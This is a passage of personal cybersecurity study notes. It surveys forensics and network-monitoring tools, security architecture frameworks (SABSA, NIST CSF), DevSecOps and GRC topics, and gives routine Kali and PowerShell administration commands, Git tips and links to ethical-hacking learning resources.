https://github.com/TheHive-Project[TheHive] is a scalable 4-in-1 open source and free Security Incident Response Platform designed to make life easier for SOCs, CSIRTs, CERTs and any information security practitioner dealing with security incidents that need to be investigated and acted upon swiftly. It is the perfect companion for MISP. You can synchronize it with one or multiple MISP instances to start investigations out of MISP events. You can also export an investigation's results as a MISP event to help your peers and partners detect and react to attacks you've dealt with. Additionally, when TheHive is used in conjunction with Cortex, security analysts and researchers can easily analyze hundred of observables at once using more than 100 analyzers, contain an incident or eradicate malware thanks to Cortex responders.

==== Volatility Framework
Digital investigations had focused primarily on finding contraband within hard drive images. https://www.volatilityfoundation.org/[Volatility Foundation] introduced people to the power of analyzing the runtime state of a system using the data found in volatile storage (RAM). It also provided a cross-platform, modular, and extensible platform to encourage further work into this exciting area of research. Another major goal of the project was to encourage the collaboration, innovation, and accessibility to knowledge that had been common within the offensive software communities.

​Since that time, memory analysis has become one of the most important topics to the future of digital investigations and Volatility has become the world’s most widely used memory forensics platform. The project is supported by one of the largest and most active communities in the forensics industry. Volatility also provides a unique platform that enables cutting edge research to be immediately transitioned into the hands of digital investigators. As a result, research built on top of Volatility has appeared at the top academic conferences and Volatility has been used on some of the most critical investigations of the past decade. It has become an indispensible digital investigation tool relied upon by law enforcement, military, academia, and commercial investigators throughout the world.

Volatility development is now supported by The Volatility Foundation, an independent 501(c) (3) non-profit organization. The foundation was established to promote the use of Volatility and memory analysis within the forensics community, to defend the project's intellectual property (trademarks, licenses, etc.) and longevity, and, finally, to help advance innovative memory analysis research. Along these lines, the foundation was also formed to help protect the rights of the developers who sacrifice their time and resources to make the world’s most advanced memory forensics platform free and open source.

==== Winpmem

==== Persistence Investigations & Layered Drivers
* Layered drivers help find network sniffers, keyboard key loggers
* Triage methodology for persistence, focusing on layered drivers
* Common attacker practices:
** Redline - detects drivers and displaying information about them
** NTFS Driver - System Restore Driver should be check what is layered on top of it. It is called SR
KBD Class driver, associated with Key logging driver.

New Audit Viewer for Memoryze: https://www.fireeye.com/blog/threat-research/2008/11/new-audit-viewer-for-memoryze.html
Forensics #2 / Windows Forensics using Redline: https://attackersmindset.com/2018/05/22/forensics-2-windows-forensics-using-redline/
Redline user’s Guide: https://www.fireeye.com/content/dam/fireeye-www/services/freeware/ug-redline.pdf

==== SOF ELK

SOF-ELK® is a “big data analytics” platform focused on the typical needs of computer forensic investigators/analysts and information security operations personnel. The platform is a customized build of the open source Elastic stack, consisting of the Elasticsearch storage and search engine, Logstash ingest and enrichment system, Kibana dashboard frontend, and Elastic Beats log shipper (specifically filebeat). With a significant amount of customization and ongoing development, SOF-ELK® users can avoid the typically long and involved setup process the Elastic stack requires. Instead, they can simply download the pre-built and ready-to-use SOF-ELK® virtual appliance that consumes various source data types (numerous log types as well as NetFlow), parsing out the most critical data and visualizing it on several stock dashboards. Advanced users can build visualizations the suit their own investigative or operational requirements, optionally contributing those back to the primary code repository.

Link: https://github.com/philhagen/sof-ELK 
Training: https://youtu.be/Hk6An-LJ4jY   

==== Base64 Encoded Data
Base64 endoded data is not human readable, but it is determinsitic, similar to rot13 decoder.

. https://digital-forensics.sans.org/blog/2011/01/09/digital-forensics-finding-encoded-evidence[Finding encoded evidence]
. https://az4n6.blogspot.com/2017/10/finding-and-decoding-malicious.html[Finding and Decoding Malicious PowerShell Scripts]
. https://skorks.com/2009/08/different-types-of-encoding-schemes-a-primer/[Different Types Of Encoding Schemes – A Primer]
. https://github.com/secnonsense/decode.py[Python Decoder]

=== Network Tools

==== Security Onion
https://securityonion.net/[Security Onion] is a free and open source Linux distribution for intrusion detection, enterprise security monitoring, and log management. It includes Elasticsearch, Logstash, Kibana, Snort, Suricata, Zeek (formerly known as Bro), Wazuh, Sguil, Squert, CyberChef, NetworkMiner, and many other security tools. The easy-to-use Setup wizard allows you to build an army of distributed sensors for your enterprise in minutes!

==== Suricata
https://suricata-ids.org/[Suricata] is a free and open source, mature, fast and robust network threat detection engine.

The Suricata engine is capable of real time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM) and offline pcap processing.

Suricata inspects the network traffic using a powerful and extensive rules and signature language, and has powerful Lua scripting support for detection of complex threats.

With standard input and output formats like YAML and JSON integrations with tools like existing SIEMs, Splunk, Logstash/Elasticsearch, Kibana, and other database become effortless.

Suricata’s fast paced community driven development focuses on security, usability and efficiency.

The Suricata project and code is owned and supported by the Open Information Security Foundation (OISF), a non-profit foundation committed to ensuring Suricata’s development and sustained success as an open source project.

==== Bro/Zeek
https://zeek.org/[Zeek] is an open source software platform that provides compact, high-fidelity transaction logs, file content, and fully customized output to analysts, from the smallest home office to the largest, fastest research and commercial networks.

Zeek helps organizations understand how their network is being used, supporting security, performance, audit, and capacity missions.

Thanks to its network optimized programming language, vibrant open source community, and global footprint, Zeek provides the data and insights needed to tackle today’s toughest network challenges, in the enterprise, cloud, and industrial computing environments.

==== RITA
https://www.blackhillsinfosec.com/projects/rita/[RITA] stands for Real Intelligence Threat Analytics.   It helps you to not look at individual TCP streams, but rather look at the communication as it relates to much larger timeframes.

RITA's specific goal in life is frequency analysis and beconing detection.  It also does black list analysis, long connection analysis. It uses median and average distribution of a mean.

==== Ntop
https://www.ntop.org/[ntop] started as an open source project in 1998 whose goal was to create a simple yet effective web-based traffic monitoring platform. Many things have changed since then, including the nature of the traffic being analyzed, operating systems running on PCs, and the type of users. ntop changed too and from a single-project centric effort, we evolved into a full fledged research company whose goal is still the original one. Namely innovate in network monitoring using commodity hardware and open-source operating systems. As we benefit from the open-source community, we feel obliged to return to the community what we develop, so that many others, and not just us, can benefit too.

The industry is full of hardware companies who bundle their products with open-source products, just to offer a sale argument for their products. Or software companies who depend on other (either hardware or software companies) for running their applications. ntop does not belong to any of these categories. We are not hardware-vendor dependent, and our software does not rely on third-party companies who might impose high license fee or decide to send us (and thus our users) out of business. We are developing both software that better exploit commodity hardware (so we’re not vendor locked) and that runs on the operating system kernel, and monitoring applications. We control the whole lifecycle, optimize every single bit, and provide you support for all our components, as we have developed them and nobody knows them better than us. This is quite rare on this market, and thus we have the ability to optimize the software for the hardware we use, and create better products. Very few other companies such as Ferrari, Ducati or Apple can do that (we’re small but we believe we belong to this club).

==== Coffee

==== Wireshark

=== Reverse Engineering

Link: https://github.com/0xZ0F/Z0FCourse_ReverseEngineering
Link: https://github.com/wtsxDev/reverse-engineering

=== References
. https://www.youtube.com/watch?v=DuIXbz30mqk[Think You're Compromised? What Do We Do Next?]

<<<
== Enterprise Architecture
Source: https://www.youtube.com/watch?v=NUD-LXUE4tM 

*Enterprise* is any organization that is large or small with a collaborative collection of sub-organizations with a shared set of objectives.

*Architecture* is a designed structure of something.  A description of the structure (components) and behaviors (Processes) of a system.  It is also an activity required to produce such a description.

*Enterprise Architecture* is documentation describing the structure and behaviour of an enterprise including its information systems.  Also a process for describing an enterprise(including its information systems), then planning and governing changes to improve the integrity and flexibility of the enterprise.

Frameworks provide guidelines on how to implement enterprise architecture.  Frameworks address following areas:
* Content (strcuture, metamodel)
* Process (activities)
* Organization (roles, people)

Some of the frameworks are:

* TOGAF (covers all three, content, process, and organization)
* Zachman (Purely covers content)
* SABSA
* DODAF
* MODAF

Large organizations are complex, hence they can be broken down into following typical domains

. Business (Why organization exisit, objectives, goals, strategic thinking, capabilities, processes, functions, organizatinal structure)
. Data
. Application(s)
. Technology

Following domains cut across the typical domains:

. Security
. Compliance


*Architecture Activities* typically when you are performing any sort of change, you have to document the current state and future state.  This represents the strategic vision of the organization, where they want to be in 3-5 years time.

Enterprise architecture is about overseeing these changes by defining various architecture principles and standards.  Architects then govern those changes to ensure that the standards and principles are being followed.

=== SABSA
SABSA is a framework that supports the business in reaching its goals.  It is the leading methodology for developing business operational risk-based architectures.  SABSA stands for Sherwood Applied Business Security Architecture.

It provides a framework for developing risk driven enterprise information security and information assurance architectures.

It also helps to deliver security infrastructure solutions that help critical business initiatives.

The SABSA methodology provides guidance for aligning architecture with business value, it also addresses a critical need for greater integration between security and enterprise architecture within organizations.

With SABASA organizations can achieve that important risk reward balance using a range of frameworks, models, methods, and process to manage risk and measure performance.

The SABSA model is the key to this and covers the whole lifecycle of operational capabilities.  The SABSA model has six layers:

. Contextual Architecture: The Business View (Business wisdom and business decision making)
. Conceptual Architecture: The Architect's vision (The 'big picture', business attributes profiel and risk objectives)
. Logical Architecture: The Designers Vision (Information, services, processes, applications)
. Physical Architecture: The builders/constructors view(Data mechanisms, infrastructure, platforms)
. Component Architecture: The Trademan's View (Products, Tools, Specific Standards, Technologies)
. Security Services Management Architecture: The Service Manager's view (Service management activities, processes and monitoring)

Each of the layers of the architecture model are supported by a vertical analysis based on six key questions

* What
* Why
* How
* Who
* Where
* When

The SABSA framework is flexible, scalable and applicable to any industry sector.  Instead of replacing other risk based standards, it can be combined with TOGAF, COBIT and ITIL to create an integrated compliance framework.

SABSA provides organization with "enterprise operational risk management architecture" that can be completely tailored to a specific business model. 

SABSA's governance model provide a control feedback loop

. Strategy & Planning
. Design
. Implement
. Management & Measure

<<<
== NIST Cyber Security Framework(CSF)

Key functions are

Identify:: involves determining your IT risks and securing the necessary budget and resources to defend your digital resources. Your decisions should be based on the contextualized threat intelligence you collect. In addition to assessing internal IT risk, this goal should include analyzing the security competence of third-party vendors and any customers with which you exchange data. It’s critical to identify those that represent an elevated risk to your organization’s systems and data. It’s also important to bring in threat intelligence on the risks your competitors face because you likely face similar threats.

Protect:: is about deploying the required security controls (technologies and processes) to defend your digital assets, and then validating that these controls align to the risks you identified. For example, controls should be applied to set up defenses against exploit kits, as well as undisclosed zero-day and embargoed vulnerabilities, as identified by your threat intelligence platform. You also need to safeguard against the exploitation of high-risk vulnerabilities in your technology stack.

Detect:: revolves around your ability to block attacks before they impact digital assets. Threat intelligence helps by enabling you to identify and research the evolution and trends of malware families with high risk to your organization. In addition to identifying the security patches to apply, you will also gain intelligence on which systems are most susceptible and which are being actively targeted and exploited.

Respond:: refers to how fast your security team reacts to breaches; even the strongest security postures do not offer a 100% guarantee that cyberattacks will not succeed. Threat intelligence assists in the response process by evaluating the data exposure and the digital asset damage your organization is facing. This can then be reported to all affected parties and stakeholders — not only for remediation teams, but also for non-technical personnel who may need to prepare for the impact on day-to-day operations and the potential impact on vendors, clients, and perhaps even the overall market in which you operate.

Recover:: is all about how quickly the damage inflicted upon the organization’s technology stack and surrounding ecosystem can be mitigated, including any and all operations that must be restored as the security incidents are being closed out. Threat intelligence helps pinpoint the specific measures the security team should take in order to quarantine infected systems and inoculate the malicious elements coursing through the environment. The ultimate goal in the case of a breach, of course, is to quickly and safely restore the digital assets back to fully functioning systems with all security measures intact.

Top two are proactive measures, and bottom three are reactive measures.

<<<
== Security Architecture

=== Network Architecture

=== Application Architecture

=== System Architecture

<<<
== Dev, Sec, Ops

Development, Operations, and Security operate as silos. 

*CiCd* or Continuous Integration and Continuous Delivery is key for *DevSecOps*

image::knowyourapplication.png[title="Know your application"]

Some activities to consider for DevSecOps:

* Threat Modeling
* Attack Surface Evaluation
* Static & dynamic code analysis
* Penetration Testing
* Security Code Reviews
* Fuzz Testing

Teams who are considering DevSecOps should think about:

* Frameworks & Tools
* Automating core security tasks
* Embedding securit controls and processes

Five principles for Securing DevOps

* Automate Security In
* Integration to fail quickly
* No false Alarm
* Build Security Champions
* Keep Operational Visibility



=== OWASP Top 10 App Sec Risks

. Injection
. Broken Authentication
. Sensitive Data Exposure
. XML External Exposures (XXE)
. Broken Access Control
. Security Misconfiguration
. Cross Site Scripting
. Insecure Deserialization
. Using component with known vulnerabilities
. Insufficient Logging/Monitoring

=== Real-Word Top 10 Attacks

. Direct Object Reference
. Forceful Browsing
. Null Byte Attack
. Command Injection
. Feature Abuse
. Evasion Techniques
. Subdomin Takeover
. Misconfiguration
. Cross Site Scription
. SQL Injection 

<<<
== Governance, Risk, & Compliance

A documented process must be followed to ensure compliance to security policy and to highlight risks that might be introduced when security policy requirements are not adhered to.  Some of the GRC functions are:

* Enterprise Risk Management
* IT Risk Management
* Integrated Risk Management
* Operational Risk Management
* Compliance
* Enterprise GRC Management
* Vendor/Third-Party Risk Management
* Business Continuity
* Financial Audit

=== Enterprise Risk Management

* Not necessarily covered by insurance
* Multi-dimensional assessment
* Analyzes material risks and how they relate
* Spans the entire organization ("holistic")
* Proactive & continuous
* Considers both upside and downside
* Focuses on business goals, adding value and more
* Embedded in culture and mindset 

<<<
== Kali Reference

. Add user and give root privs
.. login as root and the user

	useradd -m <username>

.. Assign a password to the user

	passwd <username>

.. Add a user to sudoers file

	usermod -a -G sudo <username>

.. Change user shell to bash

	chsh -s /bin/bash <username>

. Shrink partition
.. Login to your system as root and open a terminal window.  Lets assume the paritition is /dev/xxx/yyy and is currently 40G, and you want to reduce it to 30G

	df -k
	unmount /dev/xxx/yyy
	e2fsck -fy /dev/xxx/yyy
	resize2fs /dev/xxx/yyy 30G
	lvreduce -L 30G /dev/xxx/yyy
	resize2fs /dev/xxx/yyy
	mount /dev/xxx/yyy

. Expand partition

Lets assume the file system is /dev/xxx/yyy. Current size is 10G and you want to add another 10G
.. Show space in current Volume group, look for Free PE/Size and make note of it, in our case it

	vgdisplay

.. Extend the logical volume

	lvextend -L+10G /dev/xxx/yyy

.. Resize the filesystem

	resize2fs /dev/xxx/yyy

<<<
== Business Resilience
For a business to be sustainable it has to be able to bear any hardship it faces.  These hardships or risks can be financial, environmental, labor, suppliers, intellectual property , and technical.  Hence every business has to ensure it has documented plans on how to address the risks and become resilient.

In order for a business to be resilient, it has to ensure it follows Business Continuity Management(BCM) strategies and methodologies. BCM itself can be split into two general areas Business Continuity and Disaster Recovery.

=== Business Continuity
Some of the strategies and methodologies that a business implements are directly associated to 

==== Conference Call Guidelines
. Use a pre-conferencing/green room/waiting room (This is already configured for Teams Meetings)
. Don't re-use conference access codes (This is already configured for Teams Meetings)
. Don't record the meeting unless necessary
. Do a role call to ensure only invited attendees are on the call
. Before sharing your screen ensure you close all confidential files/applications
. If it is a sensitive meeting, and you record it, ensure the recording is encrypted and stored in a location with limited user access
. If the recording is saved on the web platform ensure you download the recording and delete it from the web platform

*References*
. NIST Guidance: https://www.nist.gov/system/files/documents/2020/03/17/Conference%20Call%20Security%20Graphic.pdf

==== Remote Working Guidelines
*Employees*

. Greet your team members using TEAMS chat feature
. Use camera when in meetings
. When in doubt call the team member
. Keep the team connected using Teams Chat and other means as per team norms.
. Over communicate
. Lock your computer when you walk away from your computer  (Windows Key + L)
. Inform you team if you are going to be away from your computer for an extended period
. Avoid multitasking

*Leader*

. Establish team norms:
.. Do we meet more frequently as a team? When? How long?
.. If we use an online meeting platform, does everyone turn on their video camera?
.. How do we ensure people are present and not multitasking?
.. What is the recommended response time to a text or email? Should we use the phone more?
.. How will we share sensitive information? Email? 
. Ensure your team knows what is the best method to contact you
. Conduct Morning Huddles
. Frequent Check-ins
. Use Teams to share for quick feedback

*References*

. https://www.forbes.com/sites/danpontefract/2020/03/01/in-the-wake-of-coronavirus-heres-how-to-lead-remote-employees/#1d44ec7152a4
. https://www.timedoctor.com/blog/run-a-remote-team/
	


=== Disaster Recovery


<<<
== Powershell Reference

. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html[Powershell Logging]
. https://github.com/PowerShell[Powershell 7]
. http://shop.oreilly.com/product/0636920024132.do[Windows Powershell Cookbook]
. https://www.youtube.com/watch?v=plqpmZruOYk[Complete Powershell in one video-beginner to professional powershell scripting]
. https://adamtheautomator.com/get-adobject/[Get-adobject]
. https://lazywinadmin.com/[Lazy Windows Administrator]
. https://www.windowscentral.com/how-create-and-run-your-first-powershell-script-file-windows-10[How to create and run a PowerShell script file on Windows 10]
. https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing[Command Line Process Auditing]
. Configure IP Address on a computer

	New-NetIPAddress -InterfaceAlias Ethernet -IPAddress 10.10.10.10 -PrefixLength 24 -DefaultGateway 10.10.10.1

. Configure DNS on a computer

	Set-DNSClientServerAddress -InterfaceAlias "Ethernet" -ServerAddress 172.16.0.10

. IP v6 - Current Status

	Get-NetAdapterBinding -ComponentID ‘ms_tcpip6’

. IP v6 - Disable 
	
	Get-NetAdapterBinding -ComponentID ‘ms_tcpip6’ | Disable-NetAdapterBinding -ComponentID ‘ms_tcpip6’ -PassThru

. Rename computer

	Rename-Computer <new name>

. Restart computer

	Restart-Computer

. Shutdown computer

	Shutdown-Computer

. Set log application, system, and security log files to 100MB and roll over after 21 days

	limit-eventlog -logname "application" -maximumsize 100MB -retentiondays 21 -overflowaction overwriteolder 
	limit-eventlog -logname "security" -maximumsize 100MB -retentiondays 21 -overflowaction overwriteolder 
	limit-eventlog -logname "system" -maximumsize 100MB -retentiondays 21 -overflowaction overwriteolder 

. Enable Remote Desktop

	set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0

. Add firewall rules to allow Remote Desktop traffic

	Enable-NetFirewallRule -DisplayGroup “Remote Desktop”

. Check for updates and install updates

	get-hotfix|grid-view
	Install-Module -Name PSWindowsUpdate
	Get-Package -Name PSWindowsUpdate
	Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot

. Set Date & Timezone

	set-date "1/1/2020 10:10 PM"
	(get-WmiObject win32_timezone).caption
	TZUTIL /s "Eastern Standard Time"

. Add a first domain controller

	Install-windowsfeature -name AD-Domain-Services -IncludeManagementTools
	Get-Command -Module ADDSDeployment
	Create Root Domain: Install-ADDSForest -DomainName “corp.momco.com”

. Add DNS Primary Zone

	Add-DnsServerPrimaryZone -NetworkID 192.168.64.0/24 -ZoneFile “192.168.64.2.in-addr.arpa.dns”
	Add-DnsServerForwarder -IPAddress 8.8.8.8 -PassThru

. Confirm DNS is working

	Test-DnsServer -IPAddress 192.168.64.2 -ZoneName "corp.momco.com"

. Add computer to a domain

	Add-Computer -DomainName <domain name>

. Add a second domain controller 

	Add-WindowsFeature AD-Domain-Services
	Install-ADDSDomainController -InstallDns -Credential (Get-Credential "CORP\Administrator") -DomainName "corp.contoso.com"

. Locate FSMO Roles

	Get-ADForest DOMAINNAME | FT SchemaMaster
	Get-ADForest DOMAINNAME | FT DomainNamingMaster
	Get-ADDomain DOMAINNAME | FT PDCEmulator
	Get-ADDomain DOMAINNAME | FT InfrastructureMaster
	Get-ADDomain DOMAINNAME | FT RIDMaster

. Add FSMO Role to a new computer

	Move-ADDirectoryServerOperationMasterRols - Identity NEW-DC -OperationMasterRole RIDMaster,InfrastrcutureMaster,DomainNamingMaster -Force

. List all accounts where password is not set to expire

	Search-ADAccount -PasswordNeverExpires | out-gridview

. List all accounts not used in last 90 days & Export to CSV

	Import-Module ActiveDirectory
	Search-ADAccount –AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Select -Property Name,DistinguishedName,LastLogonDate |	Export-CSV "C:\\InactiveADUsers.csv" -NoTypeInformation -Encoding UTF8

. Create a VM

	New-VM -MemoryStartupBytes 2048MB -Name VMNAME -path "d:\folder" -VHDPath "d:\folder\name.vhdx"

. Assign VM Network

	Get-VM -Name VMNAME | Get-VMNetworkAdapter | Connect-VMNetworkAdapter -Swtichname 'SWITCHNAME'

. Checkpoint a VM

	Get-VM | Checkpoint-VM

. Ping alternate

	Test-NetConnection
	Test-NetConnection 8.8.8.8

. Traceroute alternative

	Test-NetConnection www.bing.com -traceroute

. Telnet to a port

	Test-NetConnection www.bing.com -Port 80
	Test-NetConnection smtp.com -Port 25

. View All services in a GUI

	Get-Service | Out-Gridview

. Service management

	Stop-Service <service name>
	Start-Service <service name>
	Restart-Service <service name>
	Set-Service <service name> <-Change Service properties

. Enable/Disable Firewall

	set-netfirewallprofile -profile domain,public,private -enabled true/false

. Add a firewall rule

	New-NetFirewallRule -DisplayName "Allow Inbound Port80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
	New-NetFirewallRule -DisplayName "Block Outbound Port80" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Block

. Password Reset

	$newpwd = ConvertTo-SecureString -String "P@ssw0rd" -AsPlainText -Force
	Set-ADAccountPassword ACCOUNTNAME -NewPassword $newpwd -Reset
	Set-ADAccountPassword ACCOUNTNAME -NewPassword $newpwd -Reset -PassThru | Set-ADuser -ChangePasswordAtlogon $True

. Install RSAT Tools:

	Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
	or
	ADD-WindowsFeature RSAT-Role-Tools

. Change color of error text:

	$host.PrivateData.ErrorForegroundcolor = 'green'

. Help for all commandlets with service in the name:  
	
	help *service*

. Update help with latest modifications from Microsoft:

	Update-Help

. Show all help about a commandlet:
	
	Help <cmdlet> -full

. Show online help about a commandlet:
	
	Help <cmdlet> -online

. To show a gui for a cmdlet:
	
	Show-command <cmdlet>

. Show event log settings:
	
	get-eventlog -list

. Show top ten biggest processes:

	Get-process| sort-object -property pm -descending | select-object -first 10

. Get all objects in a cmdlet:
	
	Get-service|get-member

. Show services that are running:
	
	Get-service| where-object -FilterScript { $_.Status -eq 'Running'}

. Gsv is alias for get-service
. ? Is alias for where
. Find out what cmdlet an alias is:

	Help gsv or get-alias gsv

. List all alias:

	Gal

. The Get-PSProvider cmdlet gets the Windows PowerShell providers in the current session. You can get a particular drive or all drives in the session. Windows PowerShell providers let you access a variety of data stores as though they were file system drives. The Get-PSDrive cmdlet gets the drives in the current session. You can get a particular drive or all drives in the session. This cmdlet gets the following types of drives:
.. Windows logical drives on the computer, including drives mapped to network shares.
.. Drives exposed by Windows PowerShell providers (such as the Certificate:, Function:, and Alias: drives) and the HKLM: and HKCU: drives that are exposed by the Windows PowerShell Registry provider.
.. Session-specified temporary drives and persistent mapped network drives that you create by using the New-PSDrive cmdlet.
Beginning in Windows PowerShell 3.0, the Persist parameter of the New-PSDrive cmdlet can create mapped network drives that are saved on the local computer and are available in other sessions. For more information, see New-PSDrive. Also, beginning in Windows PowerShell 3.0, when an external drive is connected to the computer, Windows PowerShell automatically adds a PSDrive to the file system that represents the new drive. You do not need to restart Windows PowerShell. Similarly, when an external drive is disconnected from the computer, Windows PowerShell automatically deletes the PSDrive that represents the removed drive.

. Show contents of a file:

	Get-content or gc

. List modules available:

	Get-module -List Available

. To import a module: 
	
	import-module <modulename>

. To list all commands available in a module: 
	
	get-command -module <modulename>

. Add roles & Features

	Install-WindowsFeature -IncludeAllSubfeature -IncludeManagementTools File-Services

. Install .Net Framework

	Install-WindowsFeature Net-Framework-Core -source d:\sources\sxs

. Repair trust relationship of a computer

	test-computersecurechannel -credential domain\admin -Repair

. To list all computers in AD:

	get-adcomputer -filter *|select -ExpandProperty name

. List services running on all computers in your domain:

	invoke-command -ComputerName (get-adcomputer -filter *|select -ExpandProperty name) -scriptblock { get-service }

. Implicit Remoting:

	Establish a session with remote computer: $session = New-PSSession -ComputerName ABCD
	Invoke-Command -Session $session -ScriptBlock { import-module activedirectory }
	Import-PSSession -Session $session -Module ActiveDirectory
	Close session: get-PSSession | remove-PSSession

. Invoke a powershell session on a remote computer:

	Enter-PSSession -ComputerName ABCD

. Invoke Troubleshooting pack:

	import-module troubleshootingpack
	get-troubleshootingpack c:\windows\diagnostics\system\Networking
	get-troubleshootingpack c:\windows\diagnostics\system\Networking| Invoke-TroubleshootingPack

. Replacement for ipconfig /all

	get-NetIPConfiguration

. Find out network adapter names and statistics

	get-NetAdapter
	get-NetAdapterStatistics

<<<
== Github Reference

=== Adding a new repository to github.com

* On the github.com page, click on 

image::github1.png[]
* Select "New Repository" 

image::github2.png[]
* Provide repository name in the provided field 

image::github3.png[]
* Click to create repository 

image::github4.png[] 
* Follow instructions on the page displayed on you local computer which has ssh access to github.

=== Creating a local folder on your computer

* Change Directory to the root folder where you want the GIT repository to be stored
* Clone the respository

	git clone <repository URL from git page>

=== What to do after renaming your github username?
After you have changed your github.com user name, you will have to relink all your local github repositories to the github on the web.  Here are the steps:

. Open GitCMD or GitBASH
. Change directory to the repository where you have cloned the respository from the web
. Check where does this repository points:

	git remote -v

image::github-repo-now.png[]
. Change to new github repository

	git remote set-url origin git@github.com:secprivrisk/CyberSecurity.git

. Confirm the change by issuing the command:

	git remote -v

image::github-repo-new.png[]
<<<
== Cheat Sheets
. https://www.malwarearchaeology.com/cheat-sheets[Cheat Sheets to help you in configuring your systems]
. https://cheatography.com/tag/ir/[IR Cheat Sheets]
. https://digital-forensics.sans.org/community/cheat-sheets[SANS DFIR Community: Cheat Sheets]
. https://zeltser.com/cheat-sheets[IT and Information Security Cheat Sheets]
. https://www.sans.org/blog/4-cheat-sheets-for-malware-analysis/[4 Cheat Sheets for Malware Analysis]
. https://www.andreafortuna.org/2017/07/03/volatility-my-own-cheatsheet-part-2-processes-and-dlls/[Volatility Cheatsheet]


<<<
== Ethical Hacking References

=== By Mayur Parmar
Want resource for OSCP?
here is the material to clear OSCP.
All the best for your journey.
How to prepare for OSCP complete guide 

Below are 5 skills which you have to improve before registering for OSCP
> Learn basic of Computer Network, Web application, and Linux
> Learn Bash and Python scripting
> Enumeration is key in OSCP lab, I repeat Enumeration is key in OSCP Lab and in real world too
> Download vulnerable VM machines from vulnhub
> Buffer Overflow (BOF) exploitation

Below are the free reference before registration of OSCP 
> https://lnkd.in/fBcwnBF
> https://lnkd.in/fXtRZK5
> https://lnkd.in/fcHg29E
> https://lnkd.in/f2-wBQJ
> https://lnkd.in/fkFNATW

Below are the reference for Buffer overflow and exploit developmet for OSCP
> https://lnkd.in/fmmU_Uz
> https://lnkd.in/fZDh9Vd

For Bash Scripting 
> https://lnkd.in/fn2wpZ5

Transferring Files from Linux to Windows & post-exploitation
> https://lnkd.in/fSJ44Eb
> https://lnkd.in/fJUGq3s

Privilege Escalation:
> https://lnkd.in/f4jsZfa
> https://lnkd.in/fFAeE3g
> https://lnkd.in/fUx6HZQ
> https://lnkd.in/fDNJGHw
> https://lnkd.in/fqPJzMP
> https://lnkd.in/fixKjR6
> https://lnkd.in/f2Nz3_a
> https://lnkd.in/fpZcJT9


Some tips and tricks for OSCP Exam & write-ups.
https://lnkd.in/fWugM5F
https://lnkd.in/fs_dDJr
https://lnkd.in/fzh5M_V
https://lnkd.in/fV3m55b
https://lnkd.in/faWFaea
https://lnkd.in/fiFGmV9
https://lnkd.in/fShfYRe
https://lnkd.in/f9mKEgu
https://lnkd.in/fjuxWZ5
https://lnkd.in/ffett24
https://lnkd.in/fivVvaz
https://lnkd.in/f973szJ
https://lnkd.in/f8ec7z5



=== By Pethuraj M

Following references were posted on LinkedIn by https://www.pethuraj.in https://www.pethuraj.com 

• 𝗔𝘄𝗲𝘀𝗼𝗺𝗲 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝗙𝗼𝗿 𝗟𝗲𝗮𝗿𝗻𝗶𝗻𝗴 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 & 𝗣𝗲𝗻𝘁𝗲𝘀𝘁𝗶𝗻𝗴
http://tiny.cc/s5Ig

• 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲𝘀-𝗳𝗼𝗿-𝗹𝗲𝗮𝗿𝗻𝗶𝗻𝗴-𝗛𝗮𝗰𝗸𝗶𝗻𝗴
http://tiny.cc/7OiG

• 𝗘𝘁𝗵𝗶𝗰𝗮𝗹 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 & 𝗖𝘆𝗯𝗲𝗿 𝘀𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗕𝗶𝗯𝗹𝗲
http://tiny.cc/0wGg

• 𝗖𝘆𝗯𝗲𝗿 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲𝘀
http://tiny.cc/m6Ig

• 𝗔𝘄𝗲𝘀𝗼𝗺𝗲 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲𝘀
http://tiny.cc/pqJg

• 𝗲𝘁𝗵𝗶𝗰𝗮𝗹-𝗵𝗮𝗰𝗸𝗶𝗻𝗴-𝗿𝗲𝗽𝗼𝘀𝗶𝘁𝗼𝗿𝘆
http://tiny.cc/IqYg

• 𝗙𝗿𝗲𝗲 𝗘𝘁𝗵𝗶𝗰𝗮𝗹 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗲𝗕𝗼𝗼𝗸𝘀
http://tiny.cc/b6Rg


#cybersecurity #hackerone #bugcrowd #wapt #pentest #security #hacking #pentesting #bugbounty #owasp #burpsuite #ceh #oscp #ethicalhacking #infosec

== Terms Used
[horizontal]
ATT&CK:: Adversatial Tactics Techniques & Common Knowledge
APT:: Advanced Persistent Threat
CTF:: Capture The Flag
CTI:: Cyber Threat Intelligence
EDR:: Endpoint Detection and Response
ICS:: Industrial Conrol Systems
IOC:: Indicators of Compromise
LLMNR:: Link Local Multicast Name Resolution
Med-jacking:: is a new kind of cybersecurity threat to health care systems. Medjacking involves hacking into medical devices using backdoors to access software on the device.
mDNS:: Multicast Domain Name System
MDR:: Managed Detection and Response
MSSP:: Managed Security Services Provider
OCG:: Organized Criminal groups
OSINT:: Open Source Inteligence Tools: Gathering odata from open source or readily and freely available sources
PLC:: Programmagle Logic controller
SIGINT:: Signals Intelligence is the act of gathering information in transit by interception.
Smishing:: Phishing through SMS
TTP:: Techniques, Tactics, Procedures
UEBA:: User Entity Behaviorial Analytics
Vishing:: Phishing through voice calls
WPAD:: Web Proxy Auto Discovery Protocol

<<<
[bibliography]
== References

. Writing Position Papers: http://www.studygs.net/wrtstr9.htm 
. Cover Page graphic: https://www.pinterest.com/pin/352758583290504850/ 
. What is Malware? https://www.avg.com/en/signal/what-is-malware



